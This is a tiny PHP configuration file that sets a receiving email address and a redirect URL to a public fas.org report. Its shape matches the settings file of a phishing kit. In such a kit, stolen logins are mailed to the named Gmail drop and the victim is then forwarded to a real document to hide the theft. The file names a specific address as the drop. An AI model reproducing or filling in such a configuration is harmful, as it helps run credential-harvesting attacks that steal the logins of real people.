<?php 
$Receive_email="markbroody1@gmail.com";
$redirect="https://sgp.fas.org/crs/row/RL33534.pdf";
?>